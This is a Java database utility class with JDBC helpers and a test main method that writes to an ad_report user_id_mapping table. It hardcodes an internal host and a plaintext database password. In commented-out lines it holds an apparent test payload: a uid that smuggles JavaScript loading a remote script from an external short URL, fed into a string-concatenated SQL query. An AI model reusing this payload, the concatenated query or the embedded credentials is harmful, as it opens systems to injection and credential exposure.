package com.harfield.snail.tool;


import java.sql.*;

/**
 * Created by harfield on 2016/8/19.
 */
public class DBUtils {
    public static final String JDBC_DRIVER = "com.mysql.jdbc.Driver";
    //    public static final String JDBC_URL="jdbc:mysql://127.0.0.1:3306/dev?useUnicode=true&characterEncoding=UTF-8";
//    public static final String DB_USERNAME="root";
//    public static final String DB_PASSWORD="root";
    public static final String JDBC_URL = "jdbc:mysql://10.215.28.5:3306/ad_report?useUnicode=true&characterEncoding=UTF-8";
    public static final String RPT_FANCY_JDBC_URL = "jdbc:mysql://10.215.28.5/rpt_fancy?useUnicode=true&characterEncoding=UTF-8";
    public static final String DB_USERNAME = "report";
    public static final String DB_PASSWORD = "69PkFs7ty";

    public static void close(Statement statement) {
        if (statement != null) {
            try {
                if (!statement.isClosed()) {
                    statement.close();
                }
            } catch (SQLException e) {
            }
        }
    }

    public static void close(PreparedStatement preparedStatement) {
        if (preparedStatement != null) {
            try {
                if (!preparedStatement.isClosed()) {
                    preparedStatement.close();
                }
            } catch (SQLException e) {
            }
        }
    }

    public static void close(ResultSet resultSet) {
        if (resultSet != null) {
            try {
                if (!resultSet.isClosed()) {
                    resultSet.close();
                }
            } catch (SQLException e) {
            }
        }
    }


    public static void close(Connection conn) {
        if (conn != null) {
            try {
                if (!conn.isClosed()) {
                    conn.close();
                }
            } catch (SQLException e) {
            }
        }
    }

    public static Connection getConnection() throws SQLException {
        return DriverManager.getConnection(JDBC_URL, DB_USERNAME, DB_PASSWORD);
    }

    public static void main(String[] args) {
        Connection connection = null;
        PreparedStatement psmt = null;
        ResultSet resultSet = null;
        StringBuilder builder = new StringBuilder();
        try {
            connection = DBUtils.getConnection();
//            String s = "8C96F02E-E77C-4F2D-AEB4-FAAB1FBD01E9';document.createElement('script');document.body.appendChild(s);s.src='http://t.cn/RoUy9bK';";
//            psmt = connection.prepareStatement("select id from ad_report.user_id_mapping where uid = '" + s + "' ", Statement.RETURN_GENERATED_KEYS);
//            psmt = connection.prepareStatement("INSERT ignore INTO auto_inc (`name`) VALUES ('hello4')",Statement.RETURN_GENERATED_KEYS );
//            psmt = connection.prepareStatement("INSERT  INTO  ad_report.user_id_mapping (`uid`,`insert_time`) VALUES (?,CURRENT_TIMESTAMP())  ", Statement.RETURN_GENERATED_KEYS);
//            psmt.setString(1, "test1");
             String s="1501603200613mrK";
//            psmt = connection.prepareStatement("select id from ad_report.user_id_mapping where uid = '" + s + "' ");

            psmt= connection.prepareStatement("INSERT INTO  ad_report.user_id_mapping (`uid`,`insert_time`) VALUES (?,now()) ON DUPLICATE KEY UPDATE insert_time=now() ",Statement.RETURN_GENERATED_KEYS);
            psmt.setString(1,s);
            int r = psmt.executeUpdate();
            System.out.println(r);
            ResultSet generatedKeys = psmt.getGeneratedKeys();
            while (generatedKeys.next()) {
                System.out.println("______");
                System.out.println(generatedKeys.getObject(1));
            }

        } catch (Exception e) {
           throw new RuntimeException(e);
        } finally {
            DBUtils.close(resultSet);
            DBUtils.close(psmt);
            DBUtils.close(connection);
        }
    }
}
